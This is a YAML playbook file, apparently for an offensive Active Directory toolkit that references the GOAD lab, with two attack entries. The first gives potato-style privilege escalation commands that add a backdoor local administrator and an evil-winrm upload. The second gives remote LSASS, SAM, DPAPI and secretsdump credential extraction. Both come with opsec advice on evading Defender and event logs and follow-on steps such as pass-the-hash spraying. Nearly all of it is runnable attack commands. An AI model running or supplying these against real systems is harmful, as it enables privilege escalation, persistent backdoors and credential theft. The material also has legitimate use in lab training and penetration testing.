  - id: seimpersonate_potato
    name: SeImpersonatePrivilege — Potato Escalation
    tab: Privilege Escalation
    requires:
      - TARGET_IP
      - USERNAME
      - PASSWORD
    requires_priv: local_admin
    tags:
      - seimpersonate
      - potato
      - privesc
      - iis
      - mssql
    description: >
      Escalate from IIS/MSSQL service account (SeImpersonatePrivilege) to
      SYSTEM using potato attacks. GOAD's IIS/MSSQL service accounts have
      this privilege. SweetPotato, PrintSpoofer, or GodPotato all work.
    commands:
      - label: "Check SeImpersonatePrivilege"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'whoami /priv'"
      - label: "PrintSpoofer — escalate to SYSTEM"
        cmd: "PrintSpoofer.exe -c 'net user sysadmin Passw0rd123! /add && net localgroup administrators sysadmin /add'"
      - label: "GodPotato — SYSTEM shell"
        cmd: "GodPotato.exe -cmd 'net user sysadmin Passw0rd123! /add'"
      - label: "SweetPotato — SYSTEM reverse shell"
        cmd: "SweetPotato.exe -a 'net user sysadmin Passw0rd123! /add && net localgroup administrators sysadmin /add'"
      - label: "Via WinRM — upload and run"
        cmd: "evil-winrm -i {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -e /opt/tools/"
    next:
      - Dump SAM and LSASS with SYSTEM privileges
      - Use SYSTEM context for Kerberos ticket extraction
      - Check for domain credentials in memory
    opsec: >
      Process creation events (4688) generated. Defender may detect potato
      technique. Prefer in-memory execution or custom compiled binaries.
    cleanup:
      - label: "Remove added local admin"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -x 'net user sysadmin /delete'"

  - id: lsass_dump
    name: LSASS Dump — Credential Extraction
    tab: Credential Attacks
    requires:
      - TARGET_IP
      - DOMAIN
      - USERNAME
      - PASSWORD
    requires_priv: local_admin
    tags:
      - lsass
      - dump
      - credentials
      - av-trigger
    description: >
      Dump LSASS to extract plaintext passwords, NTLM hashes and Kerberos
      tickets from memory. Use multiple methods — remote via secretsdump is
      quieter than on-target Mimikatz which triggers Defender.
    commands:
      - label: "Remote LSA dump via NetExec (quieter)"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' --lsa"
      - label: "Remote SAM dump"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' --sam"
      - label: "Full secretsdump remotely"
        cmd: "impacket-secretsdump {DOMAIN}/{USERNAME}:'{PASSWORD}'@{TARGET_IP}"
      - label: "Dump LSASS process remotely via task"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' -M lsassy"
      - label: "Dump DPAPI secrets"
        cmd: "nxc smb {TARGET_IP} -u {USERNAME} -p '{PASSWORD}' --dpapi"
    next:
      - Add cracked/extracted credentials to vault
      - Spray NTLM hashes across network with PTH
      - Extract Kerberos tickets for PTT
      - Check for domain admin credentials in memory
    opsec: >
      LSASS access generates events 4656/4663. Remote methods via secretsdump
      are quieter than on-target Mimikatz. Defender will flag Mimikatz on disk.
